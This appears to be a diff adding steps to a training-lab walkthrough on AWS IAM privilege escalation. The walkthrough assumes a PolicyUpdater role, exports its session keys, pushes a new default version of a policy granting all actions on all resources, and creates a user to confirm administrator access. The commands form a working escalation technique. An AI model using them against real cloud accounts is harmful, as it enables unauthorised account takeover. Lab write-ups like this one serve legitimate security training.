@@ -4,7 +4,7 @@ First the profile has to be configured with the access keys provided by PT Acade
 
 ## Walkthrough
 
-Get the attached user policies for `student` user which shows `IAMReadOnlyAccess` permission 
+Get the attached user policies for `student` user which shows `IAMReadOnlyAccess` permission `aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena`
 
 ![image](https://user-images.githubusercontent.com/46797181/222863836-e087ae15-632c-4700-9537-0d8fa592fd96.png)
 
@@ -69,5 +69,51 @@ View the policy document for v1 version of Print policy `aws iam get-policy-vers
 Assume PolicyUpdater role. `aws sts assume-role --role-arn arn:aws:iam::213923356313:role/PolicyUpdater --role-session-name policy_jllerena --profile PTAcademyJllerena`
 
 ![image](https://user-images.githubusercontent.com/46797181/222871903-58f59a50-c386-4b5c-86e4-2202dac6d638.png)
+
+Set the access key id, secret access key, and session token in environment variables.
+
+```
+export AWS_ACCESS_KEY_ID=<access key id>
+export AWS_SECRET_ACCESS_KEY=<secret access key>
+export AWS_SESSION_TOKEN=<session token>
+
+```
+
+Create a new policy version and set it as default. Use the following policy document for Administrator Access.
+```
+{
+ "Version": "2012-10-17",
+ "Statement": [
+   {
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+   }
+  ]
+}
+```
+Execute `aws iam create-policy-version --policy-arn arn:aws:iam::165405147110:policy/Print --policy-document file://jllPolicy.json --set-as-default`
+
+Then unset the env variables
+```
+unset AWS_ACCESS_KEY_ID
+unset AWS_SECRET_ACCESS_KEY
+unset AWS_SESSION_TOKEN
+```
+![image](https://user-images.githubusercontent.com/46797181/222872569-bfec65e6-12ca-4b6f-a500-50356d5abe1a.png)
+
+Check the new version of the Print policy. `aws iam get-policy-version --policy-arn arn:aws:iam::165405147110:policy/Print --version-id v2 --profile PTAcademyJllerena`
+
+![image](https://user-images.githubusercontent.com/46797181/222872694-b05df9e4-6322-4f64-b2c3-baf9464e0f05.png)
+
+Try creating a new user on the AWS account named jllerena to verify `Administrator` access. `aws iam create-user --user-name jllerena --profile PTAcademyJllerena`
+
+![image](https://user-images.githubusercontent.com/46797181/222873174-331a6285-8263-4238-9029-a4c7040f8c63.png)
+
+With the new permissions, a new user was possible to create, therefore privilege escalation has been achieved 
+
+
+
+
 
 
